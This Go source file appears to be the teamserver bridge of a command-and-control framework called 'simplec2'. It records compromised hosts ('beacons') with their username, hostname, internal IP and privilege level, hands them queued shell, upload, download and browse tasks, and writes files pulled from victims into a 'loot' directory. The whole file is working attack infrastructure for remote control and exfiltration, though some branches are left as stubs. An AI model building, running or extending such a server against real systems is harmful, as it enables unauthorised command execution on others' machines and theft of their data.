package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf8"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"

	"github.com/google/uuid"

	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/peer"
	"google.golang.org/grpc/status"

	"simplec2/pkg/bridge"
	"simplec2/pkg/config"
	"simplec2/teamserver/data"
)

// server is used to implement bridge.TeamServerBridgeService.
type server struct {
	bridge.UnimplementedTeamServerBridgeServiceServer
	Config *config.TeamServerConfig
	Store  data.DataStore
}

// NewServer creates a new server instance with the given configuration and datastore.
func NewServer(cfg *config.TeamServerConfig, store data.DataStore) *server {
	return &server{Config: cfg, Store: store}
}

func (s *server) StageBeacon(ctx context.Context, in *bridge.StageBeaconRequest) (*bridge.StageBeaconResponse, error) {
	log.Printf("Received StageBeacon from listener: %s", in.ListenerName)

	// Extract remote address from gRPC context
	var remoteAddr string
	p, ok := peer.FromContext(ctx)
	if ok {
		remoteAddr = p.Addr.String()
	}

	beacon := data.Beacon{
		BeaconID:      uuid.New().String(),
		Listener:      in.ListenerName,
		RemoteAddr:    remoteAddr,
		Status:        "active",
		FirstSeen:     time.Now(),
		LastSeen:      time.Now(),
		Sleep:         5, // Default sleep
		OS:            in.Metadata.Os,
		Arch:          in.Metadata.Arch,
		Username:      in.Metadata.Username,
		Hostname:      in.Metadata.Hostname,
		InternalIP:    in.Metadata.InternalIp,
		ProcessName:   in.Metadata.ProcessName,
		PID:           in.Metadata.Pid,
		IsHighIntegrity: in.Metadata.IsHighIntegrity,
	}

	if err := s.Store.CreateBeacon(&beacon); err != nil {
		log.Printf("Error saving beacon to database: %v", err)
		return nil, err
	}

	log.Printf("New beacon with ID %s saved to database", beacon.BeaconID)

	return &bridge.StageBeaconResponse{
		AssignedBeaconId: beacon.BeaconID,
	}, nil
}

func (s *server) CheckInBeacon(ctx context.Context, in *bridge.CheckInBeaconRequest) (*bridge.CheckInBeaconResponse, error) {
	log.Printf("Received CheckInBeacon from beacon: %s", in.BeaconId)

	beacon, err := s.Store.GetBeacon(in.BeaconId)
	if err != nil {
		log.Printf("Beacon %s not found during check-in: %v. Assuming exited.", in.BeaconId, err)
		return nil, status.Errorf(codes.NotFound, "beacon not found")
	}

	// Update beacon's last seen time
	beacon.LastSeen = time.Now()

	// If beacon is in 'exiting' state, send it an exit task.
	if beacon.Status == "exiting" {
		log.Printf("Beacon %s is in 'exiting' state. Sending final exit task.", in.BeaconId)
		var grpcTasks []*bridge.Task
		grpcTasks = append(grpcTasks, &bridge.Task{
			TaskId:    uuid.New().String(),
			CommandId: 4, // CommandID for exit
			Arguments: nil,
		})
		s.Store.UpdateBeacon(beacon) // Save updated LastSeen
		return &bridge.CheckInBeaconResponse{
			Tasks: grpcTasks,
		}, nil
	}

	s.Store.UpdateBeacon(beacon)

	// Find queued tasks for this beacon
	// This part needs to be implemented in the DataStore
	// For now, we will get all tasks and filter here.
	// TODO: Implement a more efficient GetQueuedTasksForBeacon(beaconID string) in DataStore
	var grpcTasks []*bridge.Task
	var dispatchedTaskIDs []uint

	// This is inefficient and should be replaced with a dedicated store method
	allTasks, err := s.Store.GetTasksByBeaconID(in.BeaconId)
	if err != nil {
		log.Printf("Error getting tasks for beacon %s: %v", in.BeaconId, err)
		return nil, err
	}

	for _, dbTask := range allTasks {
		if dbTask.Status != "queued" {
			continue
		}

		var cmdID uint32
		var taskArgs []byte

		switch dbTask.Command {
		case "shell":
			cmdID = 1
			taskArgs = []byte(dbTask.Arguments)
		case "download":
			cmdID = 2
			// ... (download logic remains the same)
		case "upload":
			cmdID = 3
			taskArgs = []byte(dbTask.Arguments)
		case "exit":
			cmdID = 4
			taskArgs = nil
		case "sleep":
			cmdID = 5
			// ... (sleep logic remains the same)
		case "browse":
			cmdID = 6
			taskArgs = []byte(dbTask.Arguments)
		default:
			log.Printf("Unknown command type for task %s: %s", dbTask.TaskID, dbTask.Command)
			continue
		}

		grpcTasks = append(grpcTasks, &bridge.Task{
			TaskId:    dbTask.TaskID,
			CommandId: cmdID,
			Arguments: taskArgs,
		})
		dispatchedTaskIDs = append(dispatchedTaskIDs, dbTask.ID)
		
		// Update task status to dispatched
		dbTask.Status = "dispatched"
		s.Store.UpdateTask(&dbTask)
	}

	return &bridge.CheckInBeaconResponse{
		Tasks:   grpcTasks,
		NewSleep: int32(beacon.Sleep),
	}, nil
}

func (s *server) PushBeaconOutput(ctx context.Context, in *bridge.PushBeaconOutputRequest) (*bridge.PushBeaconOutputResponse, error) {
	log.Printf("Received PushBeaconOutput for task %s from beacon: %s", in.TaskId, in.BeaconId)

	task, err := s.Store.GetTask(in.TaskId)
	if err != nil {
		log.Printf("Error finding task %s: %v", in.TaskId, err)
		return nil, err
	}

	var outputMessage string
	if task.Command == "upload" {
		originalPath := filepath.Base(task.Arguments)
		lootFileName := fmt.Sprintf("%s_%s", task.TaskID, originalPath)
		lootFilePath := filepath.Join(s.Config.LootDir, lootFileName)

		if err := os.WriteFile(lootFilePath, in.Output, 0644); err != nil {
			log.Printf("Error saving uploaded file for task %s: %v", task.TaskID, err)
			outputMessage = fmt.Sprintf("Failed to save uploaded file: %v", err)
		} else {
			log.Printf("Saved uploaded file to %s", lootFilePath)
			outputMessage = lootFileName
		}
	} else if task.Command == "exit" {
		outputMessage = "Beacon received exit command."
	} else {
		if utf8.Valid(in.Output) {
			outputMessage = string(in.Output)
		} else {
			decoder := simplifiedchinese.GBK.NewDecoder()
			utf8Bytes, _, err := transform.Bytes(decoder, in.Output)
			if err == nil {
				outputMessage = string(utf8Bytes)
			} else {
				outputMessage = strings.ToValidUTF8(string(in.Output), "\uFFFD")
			}
		}
	}

	task.Status = "completed"
	task.Output = outputMessage
	if err := s.Store.UpdateTask(task); err != nil {
		log.Printf("Error updating task output: %v", err)
		return nil, err
	}

	return &bridge.PushBeaconOutputResponse{}, nil
}
